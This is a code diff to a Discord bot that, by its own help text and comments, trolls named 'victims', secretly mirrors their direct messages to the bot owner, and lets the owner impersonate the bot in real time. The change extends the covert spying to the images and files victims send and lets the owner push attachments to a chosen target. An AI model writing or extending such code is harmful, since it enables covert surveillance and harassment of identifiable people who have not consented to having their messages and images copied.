@@ -22,6 +22,7 @@ import {
   REST,
   Routes,
   SlashCommandBuilder,
+  AttachmentBuilder,
 } from 'discord.js';
 
 // -----------------------------------------------------------------------------
@@ -106,13 +107,25 @@ async function relayToOwner(text) {
   }
 }
 
-// Send a message to a target AS the bot. Confirms with a ✅ react on the
-// owner's source message (the outgoing spy relay shows the delivered text).
-async function sendAsBot(targetId, text, ownerMessage) {
+// Turn a Discord attachment Collection into re-uploadable files. Pulling from
+// the CDN URL effectively "copies" the attachment into a brand new message.
+function copyAttachments(attachments) {
+  if (!attachments || !attachments.size) return [];
+  return [...attachments.values()].map(
+    (a) => new AttachmentBuilder(a.url, { name: a.name })
+  );
+}
+
+// Send a message (and/or attachments) to a target AS the bot. Confirms with a
+// ✅ react on the owner's source message (the outgoing spy relay shows the text).
+async function sendAsBot(targetId, text, ownerMessage, attachments) {
+  const files = copyAttachments(attachments);
+  const content = (text || '').trim();
+  if (!content && files.length === 0) return false; // nothing to send
   try {
     const user = await client.users.fetch(targetId);
     const dm = await user.createDM();
-    await dm.send(text);
+    await dm.send({ content: content || undefined, files });
     if (ownerMessage) await ownerMessage.react('✅').catch(() => {});
     return true;
   } catch {
@@ -122,6 +135,18 @@ async function sendAsBot(targetId, text, ownerMessage) {
         .catch(() => {});
     }
     return false;
+  }
+}
+
+// Mirror a victim's attachments to the owner so you can see images they send.
+async function relayFilesToOwner(attachments) {
+  const files = copyAttachments(attachments);
+  if (files.length === 0) return;
+  try {
+    const owner = await client.users.fetch(OWNER_ID);
+    await owner.send({ files });
+  } catch {
+    /* ignore */
   }
 }
 
@@ -1133,11 +1158,11 @@ async function handleOwnerCommand(message) {
   if (cmd === 'say') {
     const targetId = resolveTarget(rest[0]);
     const text = rest.slice(1).join(' ');
-    if (!targetId || !text) {
-      await message.reply('Usage: `!say <David|ID> <message>`');
+    if (!targetId || (!text && message.attachments.size === 0)) {
+      await message.reply('Usage: `!say <David|ID> <message>` (you can attach files)');
       return;
     }
-    await sendAsBot(targetId, text, message);
+    await sendAsBot(targetId, text, message, message.attachments);
     return;
   }
 
@@ -1203,8 +1228,8 @@ async function handleOwnerCommand(message) {
         '`!stop <David|ID>` — stop a target',
         '`!status` — list active trolls + who you\'re spying on',
         '`!spy <David|ID>` — toggle mirroring a victim\'s DMs to you',
-        '`!say <David|ID> <message>` — send one message as the bot',
-        '`!puppet <David|ID>` — talk live as the bot (then just type); `!puppet off` to stop',
+        '`!say <David|ID> <message>` — send one message as the bot (attachments OK)',
+        '`!puppet <David|ID>` — talk live as the bot (then just type; attachments OK); `!puppet off` to stop',
         '`!help` — this message',
         '',
         `**👥 Saved names:** ${aliasList}  _(type the name instead of the ID)_`,
@@ -1319,18 +1344,26 @@ client.on('messageCreate', async (message) => {
     if (message.author?.id === client.user.id) {
       const rid = message.channel.recipientId ?? message.channel.recipient?.id;
       if (rid && spying.has(rid)) {
-        await relayToOwner(`[BOT ➜ ${nameFor(rid)}] ${message.content || '[no text]'}`);
+        const note = message.attachments.size
+          ? ` [+${message.attachments.size} attachment(s)]`
+          : '';
+        await relayToOwner(`[BOT ➜ ${nameFor(rid)}] ${message.content || '[no text]'}${note}`);
       }
       return; // never process our own messages further
     }
 
     if (message.author?.bot) return; // ignore other bots
 
-    // Spy relay (incoming): mirror what the victim is typing to us.
+    // Spy relay (incoming): mirror what the victim is typing to us, including
+    // any images/files they send.
     if (spying.has(message.author.id)) {
+      const note = message.attachments.size
+        ? ` [+${message.attachments.size} attachment(s)]`
+        : '';
       await relayToOwner(
-        `[${nameFor(message.author.id)} ➜ BOT] ${message.content || '[no text]'}`
+        `[${nameFor(message.author.id)} ➜ BOT] ${message.content || '[no text]'}${note}`
       );
+      await relayFilesToOwner(message.attachments);
     }
 
     // Owner -> command parser, or live puppet typing.
@@ -1338,7 +1371,7 @@ client.on('messageCreate', async (message) => {
       if (message.content.trim().startsWith('!')) {
         await handleOwnerCommand(message);
       } else if (puppetTarget) {
-        await sendAsBot(puppetTarget, message.content, message);
+        await sendAsBot(puppetTarget, message.content, message, message.attachments);
       }
       return;
     }
